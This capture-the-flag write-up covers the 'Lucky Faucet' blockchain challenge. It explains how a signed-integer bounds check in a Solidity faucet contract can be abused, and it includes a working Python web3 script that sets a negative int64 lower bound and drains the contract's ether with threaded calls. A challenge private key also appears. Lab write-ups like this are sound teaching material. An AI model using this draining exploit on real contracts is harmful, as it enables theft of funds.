Challenge Description:
The Fray announced the placement of a faucet along the path for adventurers 
who can overcome the initial challenges. It's designed to provide enough 
resources for all players, with the hope that someone won't monopolize it, 
leaving none for others.

Writeup:
Let's grab the instance info first:
nc 83.136.253.78 59745
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 1

Private key     :  0x45c88bb7c0448935a3bf03ce81f6a3ab2a25a2878ae4d0bdb1ac5369ff2ce866
Address         :  0xDb55592cE400ec31B19BB9A8a05dbC499CBA350d
Target contract :  0x54c7b64831b575004AD9D443146501eA0BEf9DE2
Setup contract  :  0x9Cd6B0ABFe06e6dEb1943DC10784F9d303218306

In setup.sol, our solved condition is:
function isSolved() public view returns (bool) {
        return address(TARGET).balance <= INITIAL_BALANCE - 10 ether;
    }

We also start with a balance of 500 ether.

In luckyfaucet.sol, we're mainly interested in 2 functions:

function setBounds(int64 _newLowerBound, int64 _newUpperBound) public {
        require(_newUpperBound <= 100_000_000, "100M wei is the max upperBound sry");
        require(_newLowerBound <=  50_000_000,  "50M wei is the max lowerBound sry");
        require(_newLowerBound <= _newUpperBound);
        // why? because if you don't need this much, pls lower the upper bound :)
        // we don't have infinite money glitch.
        upperBound = _newUpperBound;
        lowerBound = _newLowerBound;
    }

    function sendRandomETH() public returns (bool, uint64) {
        int256 randomInt = int256(blockhash(block.number - 1)); // "but it's not actually random 🤓"
        // we can safely cast to uint64 since we'll never 
        // have to worry about sending more than 2**64 - 1 wei 
        uint64 amountToSend = uint64(randomInt % (upperBound - lowerBound + 1) + lowerBound); 
        bool sent = msg.sender.send(amountToSend);
        return (sent, amountToSend);
    }

It seems we'll need to maximize the amount sent by sendRandomEth(), which is currently
limited to 0.005 to 0.01 eth. This would be painfully long and I honestly don't think
the instance would last long enough to just brute force. Initially I tried to thread
and just brute force the transactions, but that clearly wasn't the right method.

So I started looking at how I could attack the bounds. One thing I immediately noticed
was that the bounds only had to be below a specific integer, meaning we could use negatives.
I can also see that randomInt and amountToSend were different types of integers, meaning that
the modulo was what was limiting the number. By setting my lower bound to the minimum value
that uint64 could hold, I could potentially cause a much larger value to be sent than expected.

Here was my python script to do so:

from web3 import Web3
from solcx import compile_source, install_solc, set_solc_version
import threading
import time

install_solc('v0.7.6')
set_solc_version('v0.7.6')

with open("LuckyFaucet.sol") as f:
    roulette = f.read()
compiled = compile_source(roulette, output_values=["abi"])
contract_id, contract_interface = compiled.popitem()
abi = contract_interface['abi']

w3 = Web3(Web3.HTTPProvider("http://83.136.253.78:30221/"))

address = "0x54c7b64831b575004AD9D443146501eA0BEf9DE2"
contract = w3.eth.contract(address=address, abi=abi)
transact_ceil = 100000000
int64_floor = -9223372036854775808


def set_floor():
    print(contract.functions.setBounds(int64_floor, transact_ceil).transact())

def drain():
    current_bal = w3.eth.get_balance(address)
    while current_bal >= 490000000000000000000:
        contract.functions.sendRandomETH().transact()
        current_bal = w3.eth.get_balance(address)

def monitor():
    while True:
        current_bal = w3.eth.get_balance(address)
        print(f"Balance dripped down to:{current_bal}")
        time.sleep(20)

def attack():
    threads = []
    N = 10
    for i in range(N):
        thread = threading.Thread(target=drain, args=())
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

attack()

I had multiple functions since I was running back and forth testing a lot.
This likely wasn't necessary, but I first called set_floor() in an instance to
see if it worked, then called monitor() to see how the values changed. To my surprise,
when calling attack(), it instantly terminated meaning the value was low enough to
fulfill the contract.

From here we can just check the flag:
nc 83.136.253.78 59745
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 3
HTB{1_f0rg0r_s0m3_U}
